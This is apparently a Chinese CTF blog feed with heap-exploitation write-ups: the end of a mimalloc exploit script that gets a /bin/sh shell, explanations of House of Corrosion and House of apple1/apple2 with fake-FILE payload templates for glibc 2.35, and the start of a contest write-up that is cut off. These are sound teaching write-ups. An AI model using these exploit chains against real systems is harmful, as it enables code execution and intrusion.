cyclic(<span class="number">0xa0</span>)+p64(heap_addr+<span class="number">0x188</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xa0</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">tld_main = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_addr = tld_main-<span class="number">0x216380</span></span><br><span class="line">libmimalloc_addr = tld_main-<span class="number">0x24380</span></span><br><span class="line">success(<span class="string">&quot;tld_addr :&quot;</span>+<span class="built_in">hex</span>(tld_main))</span><br><span class="line">add(<span class="number">0xb0</span>)<span class="comment">#3</span></span><br><span class="line">defreed_addr = libmimalloc_addr + <span class="number">0x2e190</span></span><br><span class="line">payload = cyclic(<span class="number">0xc0</span>)+p64(defreed_addr-<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0xb0</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xb0</span>)<span class="comment">#5</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&quot;libmimalloc_addr :&quot;</span>+<span class="built_in">hex</span>(libmimalloc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="number">0x0000000000023b6a</span></span><br><span class="line">ret_addr = rdi_addr+<span class="number">1</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = p64(heap_addr+<span class="number">0x100a0</span>)+p64(setcontext_addr)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_addr+<span class="number">0x100a0</span>)+p64(ret_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *_mi_malloc_generic+327&#x27;)</span></span><br><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="extra" scheme="http://example.com/categories/extra/"/>
    
    
  </entry>
  
  <entry>
    <title>House of Corrosion</title>
    <link href="http://example.com/2023/07/16/House-of-Corrosion/"/>
    <id>http://example.com/2023/07/16/House-of-Corrosion/</id>
    <published>2023-07-16T08:44:01.000Z</published>
    <updated>2023-09-14T17:19:27.228Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于fastbin的一种利用手法 目前做题中没有做到需要这条链的</p><p>偶然看到vnctf2022的压轴题考到了这种方法 就索性来学习一下</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>主要是通过global_max_fast来实现的 其规定了fastbin链表的最大范围 如果我们将其修改为一个很大的值 那么就会导致超出范围的chunk被释放到了fastbin</p><p>和tcachebin的mp+80利用类似 其会导致tcache的结构体的entry指针数组无法容纳下足够多的链表头指针</p><p>fastbin也有自己的用来管理链表头的数组 我们称之为fastbinY 其位于main_arena上</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161711477.png" title="image-20230716171101455" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161711477.png" alt="image-20230716171101455"></a></p><p>如果我们通过修改global_max_fast 从而把一个大chunk释放到了fastbin中 那么其指针就会超过fastbinY的范围 从而延申到高地址处 那么我们也就相当于可以往fastbinY高地址处任意写一个堆地址</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>首先我们想办法将global_max_fast的值修改为一个极大值 这里我选择的办法是largebin attack</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161715171.png" title="image-20230716171532147" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161715171.png" alt="image-20230716171532147"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161716334.png" title="image-20230716171629313" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161716334.png" alt="image-20230716171629313"></a></p><p>随后我们计算一下fastbinY和我们想要写入堆地址的偏移 如上图 这个时候和_IO_list_all偏移为0xa10</p><p>那么我们最后只需要申请一个  0x10+0xa10*2的chunk 并且将其释放 那么其指针就会被放入_IO_list_all</p><p>这一点可以延申出什么利用效果呢 如果题目存在UAF漏洞 那么我们就可以泄露fastbinY后的内存空间上的任意数据</p><p>比如此时我想要泄露main_arena+784处的内容</p><p>那么我就需要申请一个  2*（784-16）+0x10 也就是0x610的chunk</p><p>此时再次释放后 由于链表的并入机制 此时的chunk地址就会填入main_arena+784</p><p>而其原本的内容 就会被充当chunk的fd域</p><p>同理 如果我们修改已经被释放chunk的fd域 随后再次申请该chunk出来 此时的fd域就会被充当链表头 那么就相当于了一次任意写</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="heap" scheme="http://example.com/categories/heap/"/>
    
    
  </entry>
  
  <entry>
    <title>House of apple2</title>
    <link href="http://example.com/2023/07/16/House-of-apple2/"/>
    <id>http://example.com/2023/07/16/House-of-apple2/</id>
    <published>2023-07-16T07:57:37.000Z</published>
    <updated>2023-09-14T17:19:18.908Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然是名为house of apple2 但是和apple1的利用没有太大的关系 当成一条全新的链就行了</p><p>只需要一次largebin就可以实现的链 适用于2.35这样的高版本 触发条件为exit或者abort 需要调用到io结构体的vtable的overflow函数</p><h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发的方式和apple1是一样的 可以通过显示调用的exit 或者是从main函数返回的隐式exit 或者是malloc_assert输出报错信息</p><p>下面是通过exit触发的链</p><p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p><p>主要的思想就是劫持IO_list_all为堆地址 从而我们可以伪造io结构体</p><p>这里主要注意的就是两个成员  一个是_wide_data 一个是vtable</p><p>我们先说vtable 这里的思路是将其伪造为_IO_wfile_jumps </p><p>这样触发io时会调用到_IO_wfile_overflow 来看一下这个函数主要的内容</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161614545.png" title="image-20230716161414471" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161614545.png" alt="image-20230716161414471"></a></p><p>其内部调用了wdoallocbuf函数 这个函数存在一个任意函数调用的点</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615628.png" title="image-20230716161503609" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615628.png" alt="image-20230716161503609"></a></p><p>其索引是通过rax寄存器来的</p><p>而此时的rax值 就是fakeio的0xa0偏移处的wide_data成员</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615252.png" title="image-20230716161559230" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615252.png" alt="image-20230716161559230"></a></p><p>其wide_data处要求是一个结构体指针 wdoallocbuf函数会调用该指针的vtable的overflow函数</p><p>如果我们将其控制为setcontext 就可以实现一段rop 哪怕是开启了沙盒 也是适用的</p><h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p>关键的伪造点就那几个 </p><p>1.先要把_IO_list_all利用largebin attack先覆盖成可控地址 用来伪造结构体 下面称fakeio1</p><p>2.控制fakeio1的vtable为_IO_wfile_jumps 从而调用到 _IO_wfile_overflow</p><p>3.控制fakeio1的_wide_date为fakeio2</p><p>4.控制fakeio2的vtable为fakeio3</p><p>5.控制fakeio3的偏移0x68处为setcontext</p><p>需要注意的就是最后的rop链存放的位置不能影响到fakeio的其他成员 导致程序执行流无法顺利执行</p><p>还有就是之所以 不直接更改_wide_data-&gt;vtable-&gt;0x68为system函数 然后设置fakeio首地址处为&#x2F;bin&#x2F;sh  这样破坏了flag成员 无法让程序执行流按预期的执行</p><p>剩下的就参考下面的模板吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakeio1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_addr + <span class="number">0x2160c0</span></span><br><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wfile_jumps)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+fake_file</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakeio2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr+<span class="number">0xf0</span>)+p64(ret_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)+p64(<span class="number">0</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="heap" scheme="http://example.com/categories/heap/"/>
    
    
  </entry>
  
  <entry>
    <title>House of apple1</title>
    <link href="http://example.com/2023/07/07/House-of-apple1/"/>
    <id>http://example.com/2023/07/07/House-of-apple1/</id>
    <published>2023-07-07T14:29:06.000Z</published>
    <updated>2023-09-14T17:19:17.268Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2.35很好用的一条链 十分推荐学习 仍然建议是自己看完分析以后 然后动调学着伪造结构体  毕竟ctf的pwn学习主要还是培养思维</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>通过劫持io_list_all 利用exit函数触发overflow 可以达到任意地址写已知地址的功能</p><p>完整的利用链如下</p><p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p><p>而我们只需要利用largebinattack往IO_list_all中写入一个堆地址 随后在该chunk上构造结构体</p><p>首先要明白一点 exit函数的执行 会通过IO_list_all来索引所有的iofile 并且通过其vtable来索引到对应的overflow函数 那么来看一下IO_wstrn_jumps的overflow函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">         snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">                      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">                     / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最开始 进行了一个指针类型的转化 但是snf和fp还是指向同一个iofile 也就是我们的chunk</p><p>接着如果通过了这个判断 就可以进入if分支</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</span><br></pre></td></tr></table></figure><p>这里的overflow_buf是什么呢 我们来看一下_IO_wstrnfile涉及到的结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">char</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_strnfile;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>]; <span class="comment">// overflow_buf在这里********</span></span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure><p>可以看到最后一个结构体中定义了overflow_buf的数组变量</p><p>大部分情况下 这个判断是可以通过的 目前还没有遇到过不通过的情况 遇到了再做补充</p><p>进入if分支以后 可以看到我们对于fp-&gt;_wide_data存储的成员变量赋值了很多次 </p><p>赋的值我们在随后的伪造过程中可以清晰的看到 是fakefile_addr + 0xf0 或者是+0x1f0 这里先记住一下 随后再深入研究</p><p>为了实现上述的任意地址写已知值  我们需要控制一下fakefile的_wide_data成员 并且还需要使得vtable为IO_wstrn_jumps 这样就可以往 _wide_data处的指针写入fake_file+0xf0和fake_file+0x1f0</p><p>通过下面iofile的成员偏移 可以得知我们需要往fakefile的0xa0写入一个地址 往0xd8写入IO_wstrn_jumps 同时伪造好相关的成员 使得我们能够执行到IO_wstrn_overflow函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amd64：</span><br><span class="line"> </span><br><span class="line">0x0:&#x27;_flags&#x27;,</span><br><span class="line">0x8:&#x27;_IO_read_ptr&#x27;,</span><br><span class="line">0x10:&#x27;_IO_read_end&#x27;,</span><br><span class="line">0x18:&#x27;_IO_read_base&#x27;,</span><br><span class="line">0x20:&#x27;_IO_write_base&#x27;,</span><br><span class="line">0x28:&#x27;_IO_write_ptr&#x27;,</span><br><span class="line">0x30:&#x27;_IO_write_end&#x27;,</span><br><span class="line">0x38:&#x27;_IO_buf_base&#x27;,</span><br><span class="line">0x40:&#x27;_IO_buf_end&#x27;,</span><br><span class="line">0x48:&#x27;_IO_save_base&#x27;,</span><br><span class="line">0x50:&#x27;_IO_backup_base&#x27;,</span><br><span class="line">0x58:&#x27;_IO_save_end&#x27;,</span><br><span class="line">0x60:&#x27;_markers&#x27;,</span><br><span class="line">0x68:&#x27;_chain&#x27;,</span><br><span class="line">0x70:&#x27;_fileno&#x27;,</span><br><span class="line">0x74:&#x27;_flags2&#x27;,</span><br><span class="line">0x78:&#x27;_old_offset&#x27;,</span><br><span class="line">0x80:&#x27;_cur_column&#x27;,</span><br><span class="line">0x82:&#x27;_vtable_offset&#x27;,</span><br><span class="line">0x83:&#x27;_shortbuf&#x27;,</span><br><span class="line">0x88:&#x27;_lock&#x27;,</span><br><span class="line">0x90:&#x27;_offset&#x27;,</span><br><span class="line">0x98:&#x27;_codecvt&#x27;,</span><br><span class="line">0xa0:&#x27;_wide_data&#x27;,</span><br><span class="line">0xa8:&#x27;_freeres_list&#x27;,</span><br><span class="line">0xb0:&#x27;_freeres_buf&#x27;,</span><br><span class="line">0xb8:&#x27;__pad5&#x27;,</span><br><span class="line">0xc0:&#x27;_mode&#x27;,</span><br><span class="line">0xc4:&#x27;_unused2&#x27;,</span><br><span class="line">0xd8:&#x27;vtable&#x27;</span><br></pre></td></tr></table></figure><h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p>前面利用largebin往IO_list_all写堆地址的部分就不讲了</p><p>我们先大致伪造一下fakefile 随后断点打在 _IO_flush_all_lockp 观察如何满足条件 使其执行到IO_wstrn_overflow函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wstrn_jumps)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072335560.png" title="image-20230707233506450" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072335560.png" alt="image-20230707233506450"></a></p><p>通过简单的观察汇编 我们不难发现我们需要使得程序执行到_IO_flush_all_lockp+223处才可以进入overflow函数 接下来逐步n下去 观察到这里的判断 如果不使其跳转 那么我们就跳过了223处的调用</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072336308.png" title="image-20230707233633281" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072336308.png" alt="image-20230707233633281"></a></p><p>观察一下此时r15寄存器参数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072339983.png" title="image-20230707233914959" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072339983.png" alt="image-20230707233914959"></a></p><p>这里需要使得r15+0x28处小于r15+0x20处 而此时r15寄存器存储的就是我们fake_file</p><p>所以我们在对应地址布置好参数 此时再次动调 发现成功进入overflow函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wstrn_jumps)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072340474.png" title="image-20230707234040440" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072340474.png" alt="image-20230707234040440"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072341660.png" title="image-20230707234112609" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072341660.png" alt="image-20230707234112609"></a></p><p>同时你可以看到这个函数 其赋值就是通过那一堆movdpa指令 其参数时xmm0 向上溯源一下会发现就是rdi+0xf0和rdi+0x1f0两种</p><p>此时观察我们想要写入已知值的堆基址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072343194.png" title="image-20230707234301169" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072343194.png" alt="image-20230707234301169"></a></p><p>可以发现写入成功</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>需要注意的是 在_IO_wstrn_overflow+78处 你会发现其执行了IO_wsetb函数 阅读其源码 我们会发现其内部调用了free函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base); <span class="comment">// 其不为0的时候不要执行到这里</span></span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072346524.png" title="image-20230707234637488" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072346524.png" alt="image-20230707234637488"></a></p><p>这里的rdx值就是我们想要任意写已知值的地址 如果其+0x30处 不为0 那么就不会跳转 从而触发执行free函数 这里有时候需要注意一下 不过如果地址无法满足判断条件的话 这里还有一次更改fakefile参数来避免的办法</p><p>rbx寄存器的值就是我们fakefile的地址 使其0x74处的数据赋值给了eax 同时对于al寄存器和8进行test 如果其不为8的话 就可以绕过 (不乱改数据的话 我觉得很少的情况才会遇到吧</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072348174.png" title="image-20230707234823126" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307072348174.png" alt="image-20230707234823126"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="heap" scheme="http://example.com/categories/heap/"/>
    
    
  </entry>
  
  <entry>
    <title>2023天融信杯车联网比赛初赛</title>
    <link href="http://example.com/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/"/>
    <id>http://example.com/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/</id>
    <published>2023-07-03T12:40:22.000Z</published>
    <updated>2023-09-14T17:21:24.150Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这次的比赛总共有三题pwn  两题出的比较新 一题就是考烂的伪随机数 这里就不收纳进入wp了</p><h2 id="TimeMachine"><a href="#TimeMachine" class="headerlink" title="TimeMachine"></a>TimeMachine</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032042208.png" title="image-20230703204157138" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307032042208.png" alt="image-20230703204157138"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 i; <span class="comment">// [rsp+16h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// [rsp+17h] [rbp-29h]</span></span><br><span class="line">  <span class="type">double</span> v9; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// 